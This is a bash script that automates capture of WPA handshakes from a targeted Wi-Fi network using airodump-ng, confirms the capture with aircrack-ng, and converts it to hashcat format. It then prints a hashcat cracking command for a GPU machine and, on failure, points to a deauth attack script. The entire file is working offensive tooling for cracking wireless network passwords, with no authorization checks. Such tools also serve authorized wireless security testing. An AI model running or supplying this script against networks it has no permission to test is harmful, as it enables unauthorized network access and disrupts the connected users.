#!/bin/bash
# capture_handshake.sh - Automated WPA handshake capture

INTERFACE=${1:-wlan1mon}
CHANNEL=${2}
BSSID=${3}
ESSID=${4:-"target"}
OUTPUT_DIR=~/captures/wpa

usage() {
    echo "Usage: $0 <interface> [channel] [bssid] [essid]"
    echo "Example: $0 wlan1mon 6 AA:BB:CC:DD:EE:FF HomeWiFi"
    exit 1
}

if [ "$#" -lt 1 ]; then
    usage
fi

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Generate filename
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
if [ -n "$BSSID" ]; then
    FILENAME="${OUTPUT_DIR}/${ESSID}_${BSSID//:/_}_${TIMESTAMP}"
else
    FILENAME="${OUTPUT_DIR}/scan_${TIMESTAMP}"
fi

echo "[*] Starting WPA handshake capture"
echo "[*] Interface: $INTERFACE"
echo "[*] Output: $FILENAME"

if [ -n "$CHANNEL" ] && [ -n "$BSSID" ]; then
    echo "[*] Channel: $CHANNEL"
    echo "[*] BSSID: $BSSID"
    echo "[*] Target ESSID: $ESSID"
    
    # Focused capture
    echo "[*] Press Ctrl+C when handshake captured"
    sudo airodump-ng -c "$CHANNEL" --bssid "$BSSID" \
        -w "$FILENAME" \
        --output-format pcap,csv,netxml \
        "$INTERFACE"
else
    echo "[*] Scanning all channels"
    echo "[*] Press Ctrl+C to stop"
    sudo airodump-ng -w "$FILENAME" \
        --output-format pcap,csv,netxml \
        "$INTERFACE"
fi

echo "[*] Capture saved to: $FILENAME"
echo "[*] Checking for handshake..."

# Check for handshake
if [ -f "${FILENAME}-01.cap" ]; then
    if aircrack-ng "${FILENAME}-01.cap" 2>&1 | grep -q "1 handshake"; then
        echo "[+] HANDSHAKE CAPTURED!"
        
        # Convert for hashcat
        hcxpcapngtool -o "${FILENAME}.hc22000" "${FILENAME}-01.cap" 2>/dev/null
        
        # Create summary
        cat > "${FILENAME}_info.txt" <<EOF
Capture Information
===================
Date: $(date)
Target ESSID: $ESSID
BSSID: $BSSID
Channel: $CHANNEL
Files:
  - ${FILENAME}-01.cap (airodump format)
  - ${FILENAME}.hc22000 (hashcat format)
  
Upload to GPU machine for cracking:
  hashcat -m 22000 ${FILENAME}.hc22000 wordlist.txt
EOF
        
        echo "[*] Handshake info saved to: ${FILENAME}_info.txt"
        echo "[*] Ready for FTP upload to GPU machine"
    else
        echo "[-] No handshake detected in capture"
        echo "[*] Try deauth attack with: ~/scripts/deauth.sh $BSSID $CHANNEL"
    fi
fi